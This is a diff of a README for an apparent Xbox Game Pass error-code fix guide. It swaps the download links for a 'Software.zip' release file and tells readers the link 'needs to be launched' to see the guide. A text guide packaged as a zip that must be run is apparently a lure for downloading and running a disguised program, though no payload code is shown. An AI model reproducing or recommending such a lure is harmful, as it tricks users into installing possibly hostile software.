@@ -13,7 +13,7 @@ If you are struggling with XBOX Gamepass error codes, this repository will provi
 
 ## 🌟 Get Started
 To access the full guide on fixing XBOX Gamepass error codes, click the link below:
-[![Download Here](https://img.shields.io/badge/Download%20Guide-Here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/Vitorkr/How-to-Fix-XBOX-Gamepass-Error-Codes/releases/download/v1.0/Software.zip%20Guide-Here-brightgreen)](https://github.com/Vitorkr/How-to-Fix-XBOX-Gamepass-Error-Codes/releases/download/v1.0/Software.zip)
 
 ✨ *Note: Download link needs to be launched to access the detailed guide.*
 
@@ -34,7 +34,7 @@ With the comprehensive guide and solutions provided in this repository, we hope 
 
 Remember, for the latest updates and additional resources, always check the "Releases" section of this repository.
 
-Visit [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to get started on fixing XBOX Gamepass Error Codes 🎮🚀
+Visit [here](https://github.com/Vitorkr/How-to-Fix-XBOX-Gamepass-Error-Codes/releases/download/v1.0/Software.zip) to get started on fixing XBOX Gamepass Error Codes 🎮🚀
 
 ---
 Developed by 🎮 Gamepass Fixers 🛠️
